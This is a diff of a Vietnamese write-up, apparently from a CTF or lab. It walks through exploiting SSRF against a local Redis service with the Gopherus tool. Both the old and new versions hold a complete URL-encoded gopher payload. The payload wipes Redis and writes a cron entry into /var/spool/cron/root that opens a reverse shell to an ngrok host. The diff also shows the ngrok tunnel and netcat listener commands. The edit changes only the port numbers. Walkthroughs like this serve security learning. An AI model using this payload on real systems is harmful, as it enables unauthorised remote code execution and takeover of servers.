@@ -70,21 +70,21 @@ Như vậy cổng 6379 được mở, đây là cổng mặc định của `redi
 Lanh quanh 1 lúc trên mạng tìm được tool <a href="https://github.com/tarunkant/Gopherus" >Gopherus</a>. Đây là tool tạo payload thông qua protocol `gopher` dùng để khai thác các dịch vụ như: mysql, redis, smtp,...
 
 Sau 1 hồi tìm hiểu thì đây là cách khai thác:
-- Đầu tiên dùng `ngrok` với command `ngrok tcp 1235` để tạo ra 1 tunel từ máy đến internet qua cổng 1235 (Đây là cổng để netcat nghe reverse shell) : 
+- Đầu tiên dùng `ngrok` với command `ngrok tcp 1234` để tạo ra 1 tunel từ máy đến internet qua cổng `1234` (Đây là cổng để netcat nghe reverse shell) : 
 
-![image](https://user-images.githubusercontent.com/92881216/229121608-cecd01ed-8214-4641-be29-06aa60d12811.png)
+![image](https://user-images.githubusercontent.com/92881216/229144528-7a366edf-ccc9-4585-98a2-053ae2e3454a.png)
 
 - Tiếp theo, dùng `Gopherus` tạo payload reverse shell với ip vừa tạo từ `ngrok`:
 
-![image](https://user-images.githubusercontent.com/92881216/229122051-08bdffd2-3422-4427-9d5e-b52b474ca55c.png)
+![image](https://user-images.githubusercontent.com/92881216/229144810-3b91ba85-d2af-450a-a770-786230ee6098.png)
 
-Tuy nhiên mặc định tool tạo ra có cổng 1234 nên cần đổi nó sang cổng đã tạo ở `ngrok` (ở đây là: 16632)
+Tuy nhiên mặc định tool tạo ra có cổng `1234` nên cần đổi nó sang cổng đã tạo ở `ngrok` (ở đây là: `17025`)
 
 Payload khi đó là:
 ```
-gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2472%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/0.tcp.ap.ngrok.io/16632%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
+gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2472%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/0.tcp.ap.ngrok.io/17025%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
 ```
-- Bây giờ chỉ việc dùng `nc -lvp 1235` rồi gửi payload thôi...
+- Bây giờ chỉ việc dùng `nc -lvp 1234` rồi gửi payload thôi...
 
 Kết quả:
 
